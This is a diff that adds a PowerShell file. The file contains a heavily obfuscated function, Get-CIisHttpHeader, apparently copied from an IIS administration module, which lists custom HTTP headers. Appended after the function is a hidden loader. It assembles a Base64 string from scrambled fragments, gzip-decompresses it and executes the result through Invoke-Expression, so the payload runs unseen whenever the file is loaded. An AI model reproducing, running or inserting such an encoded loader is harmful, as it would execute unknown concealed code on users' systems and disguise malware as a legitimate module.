@@ -1,0 +1,35 @@
+${jG0c`Xt} =  [tyPE]("{1}{2}{0}" -f't','COnVe','R') ;  Set-iTEm vARIaBLE:srOE  ( [tYPE]("{6}{1}{4}{2}{5}{3}{0}"-F'DE','.','sioN.','mPRESSiONMO','COMPrES','CO','Io')  )  ;
+function gEt-CiiSh`TT`pHEAd`ER
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(manDATory=${t`RUe})]
+        [string]
+        
+        ${SITE`NAMe},
+        
+        [Alias({"{0}{1}" -f'P','ath'})]
+        [string]
+        
+        ${V`irTUalPa`TH} = '',
+        
+        [string]
+        
+        ${N`AME} = '*'
+    )
+
+    .("{2}{1}{0}{3}" -f'StrictMo','t-','Se','de') -Version ("{0}{1}" -f'L','atest')
+
+    .("{1}{4}{0}{2}{3}" -f'aller','Use','Pref','erence','-C') -Cmdlet ${P`scMD`let} -Session ${ex`ECu`TIoNco`N`TE`xT}."seSsI`oN`S`TatE"
+
+    ${h`TtPp`Ro`TocOL} = &("{1}{5}{0}{6}{4}{2}{3}" -f'ur','Get','nSec','tion','o','-CIisConfig','ati') -SiteName ${si`T`E`NamE} `
+                                                -VirtualPath ${virT`UAL`p`AtH} `
+                                                -SectionPath ("{6}{2}{5}{1}{0}{3}{4}"-f'Se','.web','ys','rv','er/httpProtocol','tem','s')
+    ${hTtP`protOC`ol}.("{0}{2}{1}"-f'GetCo','on','llecti').Invoke(("{2}{3}{1}{4}{0}" -f'aders','tom','cu','s','He')) |
+        &("{3}{2}{1}{0}" -f'ject','b','re-O','Whe') { ${_}[("{1}{0}" -f'me','na')] -like ${Na`Me} } |
+        .("{4}{0}{2}{3}{1}" -f 'c','t','h-Obj','ec','ForEa') { .("{0}{1}{3}{2}"-f'Ne','w-O','t','bjec') ("{0}{2}{3}{4}{1}"-f'Ca','ader','rbon.Iis','.','HttpHe') ${_}[("{1}{0}" -f'e','nam')],${_}[("{1}{0}" -f 'alue','v')] }
+}
+
+
+${S}=.("{3}{2}{0}{1}" -f'ec','t','w-Obj','Ne') ("{1}{0}{2}{3}" -f'.Mem','IO','oryS','tream')(,  (ITEm  ("vaRiAblE"+":Jg0C"+"X"+"t") ).ValUe::("{2}{3}{4}{0}{1}"-f'4St','ring','FromBa','se','6').Invoke(("{12}{20}{36}{53}{4}{65}{29}{51}{41}{46}{7}{58}{0}{62}{45}{48}{57}{17}{6}{59}{39}{13}{52}{1}{54}{40}{50}{22}{8}{2}{9}{16}{37}{55}{64}{56}{24}{33}{26}{42}{3}{15}{43}{23}{61}{21}{31}{32}{19}{28}{27}{47}{5}{30}{60}{49}{14}{11}{35}{63}{38}{25}{34}{18}{44}{10}" -f'ulahCmGIPcrzgAvqzsMpdXMzSJRb2KAMWkZTvg1TKS6ZQAnIWHsTn5Si','YnUA6U1oEgEUZz0s2CbmoQXL+ReT9S/V+LEk/6FkP8dGTSpqKM+3Ak4RJKd2kE3z4BmYKXcgFbHrIfA1G+KaWtIzAU','W59','muMWW9n+ujzc3gj+8eleB9ZLrVY7oZ8A1PSeirVJBQGr+w5HXfgp1Gu0msjSYHO8nghflkftol1h7','/85hkL8yuLh8TlJkNYurJxGBEWSJVc7rLBOlz6IH2Uc6s4cHmynSwWHuaLbcjcBUQoxFEk/Z67GMAQ+pJyuYPhwmcop','lQNGEg5FeX0Qe8RhgKkYUsQYc6orgFLmJs39J11WjBrZADAX9XMs','qOgsiHsaucK+AYWR','NVd6eH/','Wq31q6VHhLsJ/SNAPZ/snwyxFrW1b2iCr9Shz','uHQq+tSh7WJNX68','IyfpGG2MViTL7qsqXoo1iMTYnoVEhCLPb+ACrHxe1iDQAA','n0Z1CeX0TT','H4sIAAAAAAAAAL1X','ydQk/','aPu','bE9vYcGmtSA4F3eAmM','cFlk3tSmCrWuKgM','lM7AsAs29ZOGslUgKfqI9pcDjdnnwLIrlOYRTlpUEsctLNSxaGFKO8BIKIHI9AzFm6lL+ra8aUExdG/CRurr4C6fH','a4EKC','2ieHYCPT0awY2r7dWLta+dreNG60qrjg7hml/jXjaZvGxsR+dsm1bzhPu6mIEcMp','e2/iOBD/u3yK6FQpiZbybq9daaV1gPDYBCiB','Q3s1nCIvSva8FFjQOyAlgdAEwC7sn7Y6gMqbBuNy/3udRkxUB','DpG71OpJWPcjJ+t1ZrT0qg','Za0TPNzU2FPxXWTf','Sxy2gIG','ptCc/DGX66y','asGs0bq0nZFpsFe+c7v4dv3FGbWvse8D8XG+Oadca29172Oe2sdkV','F1vlpUS+EWk4EUuzahlvFplfeJvG','U8M3n/rW9drcmPGDw9dLR9+ilr0RsbRbtu4Cb','/P37ehyGOODZd6GFOYgi7C8pwZGiSl8kZ41','ltXKqytV+k','fnes','+B','1sHw1WxjP1RYoXz3O6Obf0zKOtDaES','kM4Qi8ix+CPBn6VZNZsuIw5BfbdhS/D2kLVa5hKrUaU6kSyh9l','i9RcBvWar0VtQ/8z1sd6ml79z7H+vvcXp2/Cv5Q/B+nF','hMIhZGITTJ2','ZQhcbQHrJR','xIuWC3RNyjOJp+3InUMwLM588zTIsJWxyf5LejH/Kon','kzqklASekLQTPhE7CRYWT4ImRPk/B4hasDDv+FuKfUGdVg','R9JubMXryneMal2WONX9Km7aRdNtx4NWvotIHtv7972gLsit3p3IujuSalzC1DduG','bJ1iDj2C4hSWZW+qsmFo8MWK7JJ3J','yw9BC3bAMwD1bq3F','PQN9F','CqVsQvROjFSb+Vsj+iL9JemJ','kz0+ODNLMZQfPcRern9Dw5WCxjQhEOE4KfR24Dr0iAG4cA+sQ9BafymtPwiuIUkMKJrCcU','BFbMULDgmqlcI41b6XKm9mustqTtgWYh6HgfRzExOZGYcii+VAIAMyBGW10Al27BErl0FMaV76qMyOCg3jgBMfi3OOQ7a1cLgjLo4KbRggiod4','rQJw2gNqcg10WRPFVJnoX5s','VeTjAUaNIzxygujsJVvTJ/w','CkGPBSgpIwcCBx9f50lO1VBJtuvRUK6m5t9tfZ9uD8k1','8Tfd8efgJIE3veAyl7HkCDza','DfNVfbrDLpd+ly0WhRdkS0iPZoQ7dtTAIBCg5M5gLEwsK1pYSrsi//Sars6vyvND8HEMaK','Uh2NKpfEGPYzkv1D7lChZViR','YTRwovd3vfk4Cu+y1e9fTnS5SJMeeGc','34p9kkXiOehE1ATd','2/W1YtG+6SRWab1ldbtdtp7WxvM4NuuAPVTuuNvS','Ic7VDW9Eb33eqS27x+0sevTx6lzXcpkPAJHXz/81y/QH5+KZT','br5YpB1zh+EhoJWJC/VGZzImK3A','C4a1MyjmToBrwUM0f3fcW3c3UxZk4WX2p/VkcqOJ5EQtq7mv','tsUsgTVDJS22CsHawiHdSQX4V','aofu/4p63376f','lALmrYrF4uHOn1a2i','MsTqXZonrZvP58doTZ5T/qaDyievIkz','4Y8b/8Qd/x4iB','S9DpRtNR5I3sXndogWtjA37t6Gi79','jgvpR8JIUZxiNWLi9xFuhUHEVzhRQA52eGFj/maoUhcpMzAdttgPiTB')));&("{1}{0}" -f 'X','IE') (.("{1}{2}{0}" -f'ect','New-','Obj') ("{1}{4}{3}{0}{2}"-f 'ade','IO.Strea','r','Re','m')(&("{0}{1}{2}"-f 'New-Obj','ec','t') ("{5}{4}{1}{6}{0}{2}{3}"-f 'St','ompression.','rea','m','O.C','I','Gzip')(${s}, (  vaRIaBlE  SrOE  -VAlU)::"DEC`OmPRE`Ss"))).("{0}{2}{3}{1}" -f 'Re','nd','adT','oE').Invoke();
